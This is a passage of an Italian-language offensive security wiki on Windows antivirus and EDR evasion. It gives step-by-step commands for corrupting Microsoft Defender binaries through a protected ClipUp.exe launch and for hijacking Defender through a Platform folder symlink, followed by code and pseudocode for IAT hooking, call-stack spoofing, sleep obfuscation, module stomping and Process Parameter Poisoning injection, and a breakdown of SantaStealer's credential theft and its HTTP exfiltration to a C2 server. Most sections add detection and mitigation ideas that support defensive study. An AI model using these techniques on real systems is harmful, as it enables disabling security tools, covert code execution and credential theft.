CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binary di sistema firmato `C:\Windows\System32\ClipUp.exe` esegue il proprio processo figlio e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con il supporto PPL.
- ClipUp non può analizzare percorsi contenenti spazi; usa i percorsi brevi 8.3 per puntare a posizioni normalmente protette.

Helper per i percorsi brevi 8.3
- Elenca i nomi brevi: `dir /x` in ogni directory padre.
- Ricava il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avvia il LOLBIN compatibile con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (ad esempio CreateProcessAsPPL).
2) Passa a ClipUp l'argomento relativo al percorso del log per forzare la creazione di un file in una directory AV protetta (ad esempio Defender Platform). Usa i nomi brevi 8.3 se necessario.
3) Se il binary di destinazione è normalmente aperto/bloccato dall'AV durante l'esecuzione (ad esempio MsMpEng.exe), pianifica la scrittura all'avvio, prima che l'AV venga avviato, installando un servizio auto-start che venga eseguito prima in modo affidabile. Convalida l'ordine di avvio con Process Monitor (boot logging).
4) Al riavvio, la scrittura con supporto PPL avviene prima che l'AV blocchi i propri binary, danneggiando il file di destinazione e impedendone l'avvio.

Esempio di invocazione (percorsi rimossi/accorciati per sicurezza):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare il contenuto scritto da ClipUp, ma solo la sua posizione; la primitive è adatta alla corruzione piuttosto che all'iniezione precisa di contenuti.
- Richiede privilegi local admin/SYSTEM per installare/avviare un servizio e una finestra di riavvio.
- Il timing è fondamentale: il target non deve essere aperto; l'esecuzione al boot evita i file lock.

Rilevamenti
- Creazione del processo `ClipUp.exe` con argomenti insoliti, soprattutto quando il processo padre è un launcher non standard, durante il boot.
- Nuovi servizi configurati per avviare automaticamente binari sospetti e che vengono avviati sistematicamente prima di Defender/AV. Analizzare la creazione/modifica dei servizi prima dei malfunzionamenti di avvio di Defender.
- Monitoraggio dell'integrità dei file sui binari e sulle directory Platform di Defender; creazioni/modifiche impreviste effettuate da processi con protected-process flags.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo del livello PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e con quali processi padre; bloccare l'invocazione di ClipUp al di fuori dei contesti legittimi.
- Service hygiene: limitare la creazione/modifica dei servizi ad avvio automatico e monitorare la manipolazione dell'ordine di avvio.
- Assicurarsi che la tamper protection di Defender e le early-launch protections siano abilitate; analizzare gli errori di avvio che indicano la corruzione dei binari.
- Valutare la disabilitazione della generazione dei nomi brevi 8.3 sui volumi che ospitano gli strumenti di sicurezza, se compatibile con il proprio ambiente (testare accuratamente).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender sceglie la platform da cui viene eseguito enumerando le sottocartelle in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (ad esempio `4.18.25070.5-0`), quindi avvia da lì i processi del servizio Defender (aggiornando di conseguenza i percorsi del servizio/del registro). Questa selezione si fida delle directory entries, inclusi i directory reparse points (symlink). Un amministratore può sfruttare questo comportamento per reindirizzare Defender verso un percorso scrivibile dall'attacker e ottenere DLL sideloading o causare un'interruzione del servizio.<sup>[[21]](#references)[[22]](#references)</sup>

Prerequisiti
- Local Administrator (necessario per creare directory/symlink nella cartella Platform)
- Possibilità di eseguire un reboot o attivare una nuova selezione della platform di Defender (riavvio del servizio al boot)
- Sono necessari solo strumenti integrati (`mklink`)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la selezione della platform si fida delle directory entries e sceglie la versione lessicograficamente più alta senza verificare che il target risolva a un percorso protetto/affidabile.

Passo dopo passo (esempio)
1) Preparare un clone scrivibile della cartella platform corrente, ad esempio `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con una versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo sotto `C:\TMP\AV\` e la configurazione del servizio/registro che riflette tale posizione.

Opzioni post-exploitation
- DLL sideloading/code execution: Rilascia/sostituisci le DLL che Defender carica dalla propria directory dell'applicazione per eseguire codice nei processi di Defender. Consulta la sezione precedente: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovi il version-symlink, così al successivo avvio il percorso configurato non verrà risolto e Defender non riuscirà ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce privilege escalation di per sé; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

I red team possono spostare la runtime evasion dall'impianto C2 direttamente nel modulo target effettuando l'hooking della sua Import Address Table (IAT) e instradando API selezionate attraverso codice position-independent (PIC) controllato dall'attaccante. Questo generalizza l'evasion oltre la ridotta superficie API esposta da molti kit (ad esempio, CreateProcessA) ed estende le stesse protezioni ai BOF e alle DLL di post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approccio di alto livello
- Preparare uno shellcode PIC accanto al modulo target utilizzando un reflective loader (anteposto o complementare). Il PIC deve essere self-contained e position-independent.
- Quando la host DLL viene caricata, attraversare il suo IMAGE_IMPORT_DESCRIPTOR e modificare le entry della IAT per gli import target (ad esempio, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) affinché puntino a sottili wrapper PIC.
- Ogni wrapper PIC esegue le evasion prima di effettuare il tail-call all'indirizzo dell'API reale. Le evasion tipiche includono:
- Mask/unmask della memoria attorno alla chiamata (ad esempio, cifrare le regioni del beacon, RWX→RX, modificare i nomi o i permessi delle pagine), quindi ripristinarla dopo la chiamata.
- Call-stack spoofing: costruire uno stack benigno ed effettuare la transizione verso l'API target in modo che l'analisi del call stack risolva nei frame previsti.<sup>[[9]](#references)</sup>
- Per garantire la compatibilità, esportare un'interfaccia affinché uno script Aggressor (o equivalente) possa registrare quali API sottoporre a hook per Beacon, BOF e DLL di post-exploitation.

Perché utilizzare l'IAT hooking in questo caso
- Funziona con qualsiasi codice che utilizzi l'import sottoposto a hook, senza modificare il codice del tool né fare affidamento su Beacon per effettuare il proxy di API specifiche.
- Copre le DLL di post-exploitation: l'hooking di LoadLibrary* consente di intercettare i caricamenti dei moduli (ad esempio, System.Management.Automation.dll, clr.dll) e applicare la stessa masking/stack evasion alle loro chiamate API.
- Ripristina un utilizzo affidabile dei comandi di post-exploitation che creano processi contro i rilevamenti basati sul call stack, effettuando il wrapping di CreateProcessA/W.

Schema minimo di IAT hook (pseudocodice x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocations/ASLR e prima del primo utilizzo dell'import. Reflective loaders come TitanLdr/AceLdr dimostrano l'hooking durante il DllMain del modulo caricato.
- Mantieni i wrapper piccoli e PIC-safe; risolvi la vera API tramite il valore IAT originale acquisito prima della patch oppure tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per il PIC ed evita di lasciare pagine writable+executable.

Call-stack spoofing stub
- Gli stub PIC in stile Draugr costruiscono una fake call chain (return address all'interno di moduli benigni) e poi fanno pivot verso la vera API.
- Questo elude le detection che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbinali a tecniche di stack cutting/stack stitching per atterrare all'interno dei frame attesi prima del prologo dell'API.

Integrazione operativa
- Anteponi il reflective loader alle post-ex DLL in modo che il PIC e gli hook vengano inizializzati automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target, così Beacon e BOFs beneficiano in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Considerazioni di detection/DFIR
- Integrità IAT: entry che risolvono a indirizzi non-image (heap/anon); verifica periodica degli import pointer.
- Anomalie dello stack: return address che non appartengono a immagini caricate; transizioni improvvise verso PIC non-image; ancestry di RtlUserThreadStart incoerente.
- Telemetria del loader: scritture in-process sulla IAT, attività iniziale del DllMain che modifica gli import thunk, regioni RX inattese create al caricamento.
- Evasione del caricamento delle immagini: se fai hooking di LoadLibrary*, monitora i caricamenti sospetti di automation/clr assembly correlati a eventi di memory masking.

Building block ed esempi correlati
- Reflective loader che eseguono IAT patching durante il caricamento (ad es., TitanLdr, AceLdr)
- Memory masking hook (ad es., simplehook) e PIC per lo stack-cutting (stackcutting)
- PIC call-stack spoofing stub (ad es., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hook tramite un PICO residente

Se controlli un reflective loader, puoi fare hooking degli import **durante** `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver personalizzato che verifica prima gli hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Costruisci un **PICO residente** (oggetto PIC persistente) che sopravviva dopo che il loader PIC transiente si è liberato.
- Esporta una funzione `setup_hooks()` che sovrascriva il resolver degli import del loader (ad es., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, salta gli import ordinali e usa una ricerca degli hook basata su hash, come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega al vero `GetProcAddress`.
- Registra i target degli hook al link time con le entry Crystal Palace `addhook "MODULE$Func" "hook"`. L'hook resta valido perché si trova all'interno del PICO residente.

Questo produce una **redirezione IAT import-time** senza patchare la code section della DLL caricata dopo il caricamento.

### Forzare gli import hookable quando il target usa il PEB-walking

Gli hook import-time vengono attivati solo se la funzione è effettivamente nella IAT del target. Se un modulo risolve le API tramite PEB-walk + hash (senza import entry), forza un import reale affinché il percorso `ProcessImports()` del loader possa rilevarlo:

- Sostituisci la risoluzione degli export tramite hash (ad es., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore emette una entry IAT, consentendo l'intercettazione quando il reflective loader risolve gli import.

### Sleep/idle obfuscation in stile Ekko senza patchare `Sleep()`

Invece di patchare `Sleep`, fai hooking delle **primitive effettive di wait/IPC** usate dall'implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per le attese lunghe, avvolgi la chiamata in una catena di obfuscation in stile Ekko che cifra l'immagine in memoria durante l'idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` preparati.
- Catena tipica (x64): imposta l'immagine su `PAGE_READWRITE` → esegui RC4 tramite `advapi32!SystemFunction032` sull'intera immagine mappata → esegui la wait bloccante → esegui la decifratura RC4 → **ripristina i permessi per-section** percorrendo le sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un `CONTEXT` template; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni passaggio.

Dettaglio operativo: restituisci “success” per le attese lunghe (ad es., `WAIT_OBJECT_0`) affinché il caller continui mentre l'immagine è mascherata. Questo pattern nasconde il modulo agli scanner durante le finestre di idle ed evita la signature classica di `Sleep()` “patchato”.

Idee per la detection (basate sulla telemetria)
- Burst di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- `advapi32!SystemFunction032` utilizzato su buffer contigui di grandi dimensioni, pari a quelle dell'immagine.
- `VirtualProtect` su intervalli estesi seguito dal ripristino personalizzato dei permessi per-section.

### Registrazione CFG a runtime per i gadget di sleep-obfuscation

Nei target con CFG abilitato, il primo jump indiretto verso un gadget mid-function come `jmp [rbx]` o `jmp rdi` di solito causa il crash del processo con `STATUS_STACK_BUFFER_OVERRUN`, perché il gadget non è presente nei metadata CFG del modulo. Per mantenere attive le chain in stile Ekko/Kraken all'interno di processi hardened:<sup>[[30]](#references)</sup>

- Registra ogni destinazione indiretta usata dalla chain con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e entry `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all'interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` deve iniziare alla **base dell'immagine** e coprire la **dimensione completa dell'immagine**.
- Per regioni mappate manualmente/PIC/stomped, usa invece la **base dell'allocazione** e la relativa dimensione.
- Contrassegna non solo il gadget di dispatch, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, le syscall di wait/event) e qualsiasi sezione executable controllata dall'attacker che diventerà una destinazione indiretta.

Questo trasforma le sleep chain in stile ROP/JOP da primitive che “funzionano solo nei processi non-CFG” a primitive riutilizzabili per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### Stack spoofing CET-safe per thread in sleep

La sostituzione completa di `CONTEXT` è rumorosa e può non funzionare sui sistemi CET Shadow Stack, perché un `Rip` spoofato deve comunque essere coerente con lo shadow stack hardware. Un pattern di sleep-masking più sicuro è:<sup>[[30]](#references)</sup>

- Scegli un altro thread nello stesso processo e leggi i limiti dello stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB reale del thread corrente.
- Cattura il contesto reale del thread in sleep con `GetThreadContext`.
- Copia **solo** il `Rip` reale nel contesto spoof, lasciando invariato lo `Rsp`/stack state spoofato.
- Durante la finestra di sleep, copia l'`NT_TIB` del thread spoof nel TEB corrente affinché gli stack walker eseguano l'unwind all'interno di un intervallo di stack legittimo.
- Al termine della wait, ripristina il TIB originale e il contesto del thread.

Questo preserva un instruction pointer coerente con CET, inducendo in errore gli stack walker EDR che si affidano ai metadata dello stack del TEB per validare gli unwind.

### Alternativa basata su APC: Kraken Mask

Se il dispatch tramite timer queue produce troppe signature, la stessa sequenza sleep-encrypt-spoof-restore può essere eseguita da un helper thread sospeso usando APC accodate:<sup>[[27]](#references)</sup>

- Crea un helper thread con `NtTestAlert` come entrypoint.
- Accoda frame `CONTEXT`/APC preparati con `NtQueueApcThread` e scaricali con `NtAlertResumeThread`.
- Memorizza lo stato della chain nell'heap invece che nello stack dell'helper per evitare di esaurire il default thread stack di 64 KB.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l'evento di avvio e bloccare l'esecuzione.
- Sospendi il thread principale prima di ripristinare TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) per ridurre la race window in cui uno scanner potrebbe rilevare uno stack parzialmente ripristinato.

Questo sostituisce la signature `CreateTimerQueueTimer` + `NtContinue` con una signature helper-thread/APC, mantenendo gli stessi obiettivi di RC4 masking e stack spoofing.

Idee aggiuntive per la detection
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, wait o APC dispatch.
- `GetThreadContext`/`SetThreadContext` eseguiti intorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack TEB/TIB del thread corrente.
- Chain `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o helper per il ripristino dei permessi delle sezioni.
- Uso ripetuto di short gadget signature come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all'interno di moduli firmati.


## Precision Module Stomping

Il module stomping esegue i payload dalla **sezione `.text` di una DLL già mappata all'interno del processo target** invece di allocare memoria executable privata evidente o caricare una nuova DLL sacrificale. Il target di overwrite dovrebbe essere un'**immagine caricata e disk-backed**, il cui code space possa contenere il payload senza corrompere i code path ancora necessari al processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Selezione affidabile del target

Il module stomping ingenuo contro moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una code region troppo piccola causerà il crash del processo. Un workflow più affidabile è:

1. Enumera i moduli del processo target e mantieni una **include list composta solo dai nomi** delle DLL già caricate.
2. Costruisci prima il payload e registra la sua **dimensione esatta in byte**.
3. Scansiona le DLL candidate su disco e confronta `Misc_VirtualSize` della sezione PE **`.text`** con la dimensione del payload. Questo è più importante della dimensione del file, perché riflette la dimensione della sezione executable **quando viene mappata in memoria**.
4. Analizza l'**Export Address Table (EAT)** e scegli l'RVA di una funzione esportata come offset iniziale dello stomp.
5. Calcola il **blast radius**: se il payload supera il boundary della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Helper tipici di recon/selezione osservati in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Note operative
- Preferisci le DLL **già caricate** nel processo remoto per evitare la telemetria di `LoadLibrary`/caricamenti imprevisti di immagini.
- Preferisci gli export eseguiti raramente dall'applicazione target; altrimenti i normali percorsi di codice potrebbero raggiungere i byte modificati prima o dopo la creazione del thread.
- Gli implant di grandi dimensioni spesso richiedono di cambiare l'incorporamento dello shellcode da un literal di stringa a un **byte-array/braced initializer**, in modo che l'intero buffer sia rappresentato correttamente nel codice sorgente dell'injector.

Idee per il rilevamento
- Scritture remote in **pagine eseguibili supportate da immagini** (`MEM_IMAGE`, `PAGE_EXECUTE*`) invece delle più comuni allocazioni private RWX/RX.
- Entry point degli export i cui byte in memoria non corrispondono più al file di origine sul disco.
- Thread remoti o pivot del contesto che iniziano l'esecuzione all'interno di un export legittimo di una DLL i cui primi byte sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` sulle pagine `.text` delle DLL seguite dalla creazione di un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / EDR-evasion** che evita il classico percorso di scrittura remota (`VirtualAllocEx` + `WriteProcessMemory`). Invece di copiare byte in un target già in esecuzione, sfrutta il fatto che Windows **copia alcuni parametri di avvio di `CreateProcessW` nel processo figlio** e li memorizza all'interno di `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

I carrier utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei carrier:

- `lpCommandLine` deve puntare a memoria **scrivibile** per `CreateProcessW` ed è limitato a **32.767 caratteri Unicode**, incluso il terminatore null.
- `lpEnvironment` deve essere un blocco di ambiente Unicode composto da stringhe successive `NAME=VALUE\0` terminate da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi il mapping a `ShellInfo` deve essere considerato un dettaglio di implementazione, non un contratto documentato stabile.

Questo trasforma la normale creazione di processi nella **primitiva di trasferimento del payload**. L'operatore crea il processo figlio con dati di avvio controllati dall'attaccante e lascia che sia Windows a eseguire la copia tra processi.

### Remote lookup flow without remote write APIs

Dopo la creazione del processo figlio, risolvi il buffer copiato usando primitive di sola lettura:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → ottieni `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggi il `PEB` remoto
3. Segui `PEB.ProcessParameters`
4. Leggi `RTL_USER_PROCESS_PARAMETERS`
5. Usa il puntatore selezionato:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Flusso minimo:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Esecuzione del buffer dei parametri copiato

La regione dei parametri copiata è solitamente `RW`, non eseguibile. Una catena P3 comune è:

1. Creare normalmente il processo (non sospeso)
2. Rendere eseguibile la pagina dei parametri scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l'handle del main thread già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l'esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivendo `RIP`)

A differenza dei workflow classici di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il contesto può essere modificato direttamente sull'handle del main thread restituito.

Questo evita diverse API comunemente monitorate per l'injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limitazione dei byte nulli e staged shellcode

Tutti e tre i carrier sono **dati stringa o simili a stringhe**, quindi un raw payload contenente `0x00` viene troncato durante il trasferimento. Una soluzione pratica è un **first stage privo di null** che ricostruisce le costanti a runtime e poi carica un arbitrary second stage.

Un pattern semplice è la sintesi delle costanti basata su XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Questo consente al first stage di creare stringhe per lo stack, argomenti API, percorsi DLL o un shellcode loader di second stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal first stage

Quando il first stage deve chiamare API come `LoadLibraryA`, può:

- effettuare il push della stringa/del buffer nello stack del target
- riservare la **shadow space x64 da 32 byte**
- impostare `RCX`, `RDX`, `R8`, `R9` su costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

Un second stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, convertito in `PAGE_EXECUTE_READ` con `VirtualProtect` e infine eseguito tramite un salto, evitando un'allocazione RWX diretta.

### Idee per il rilevamento

Buone opportunità di hunting menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono **eseguibili le pagine dei parametri di processo**
- tale modifica della protezione seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote del `PEB` e successivamente di `RTL_USER_PROCESS_PARAMETERS`
- valori di `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved insolitamente lunghi o ad alta entropia durante la creazione del processo

### Note

- P3 è una **tecnica di trasferimento tra processi**, non una primitiva di esecuzione completa di per sé: il parametro copiato richiede comunque una modifica dei permessi per l'esecuzione e un metodo di redirezione dell'esecuzione.
- `RtlCreateProcessReflection` / Dirty Vanity è stata presa in considerazione dagli autori, ma scartata perché raggiunge internamente primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Tradecraft di SantaStealer per l'evasione fileless e il furto di credenziali

SantaStealer (alias BluelineStealer) illustra come i moderni info-stealer combinino AV bypass, anti-analysis e accesso alle credenziali in un unico workflow.<sup>[[24]](#references)</sup>

### Verifica del layout della tastiera e ritardo del sandbox

- Un flag di configurazione (`anti_cis`) enumera i layout della tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di eseguire gli stealer, assicurandosi di non detonare mai nei locali esclusi e lasciando al contempo un artefatto utile per l'hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica `check_antivm` a più livelli

- La variante A percorre l'elenco dei processi, calcola l'hash di ogni nome con un custom rolling checksum e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B analizza le proprietà del sistema (soglia minima del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox ed esegue controlli temporali attorno alle operazioni di sleep per individuare il single-stepping. Qualsiasi rilevamento interrompe l'esecuzione prima dell'avvio dei moduli.

### Helper fileless + caricamento reflective con doppio ChaCha20

- La DLL/EXE principale incorpora un Chromium credential helper che viene scritto su disco oppure mappato manualmente in memoria; la modalità fileless risolve autonomamente imports/relocations, quindi non vengono scritti artefatti dell'helper.
- L'helper conserva una DLL di secondo stage crittografata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambi i passaggi, carica il blob in modo reflective (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Le routine di ChromElevator usano il process hollowing reflective con direct-syscall per iniettare codice in un browser Chromium attivo, ereditare le chiavi AppBound Encryption e decrittografare password/cookie/carte di credito direttamente dai database SQLite nonostante l'hardening di ABE.


### Raccolta modulare in-memory ed exfiltration HTTP a chunk

- `create_memory_based_log` scorre una tabella globale di function-pointer `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, estensioni del browser, ecc.). Ogni thread scrive i risultati in buffer condivisi e comunica il numero di file dopo una finestra di join di circa 45 secondi.
- Al termine, tutto viene compresso con la libreria `miniz` collegata staticamente come `%TEMP%\\Log.zip`. `ThreadPayload1` esegue quindi una sleep di 15 secondi e trasmette l'archivio in chunk da 10 MB tramite HTTP POST a `http://<C2>:6767/upload`, falsificando un boundary del browser `multipart/form-data` (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opzionale, mentre l'ultimo chunk aggiunge `complete: true` per informare il C2 che il riassemblaggio è terminato.

## References

- [1] [Tecniche avanzate di evasione: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack, nessun lasciapassare per il malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentazione](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – esempio](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – esempio](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC con call-stack spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuova infection chain e obfuscation basata su ConfuserEx per DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Dovresti fidarti della tua zero trust? Bypass dei controlli di postura di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Prima di ToolShell: analisi delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso degli export inoltrati](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario degli export inoltrati di Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordine di ricerca delle dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sicurezza dei processi e diritti di accesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Riferimento EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
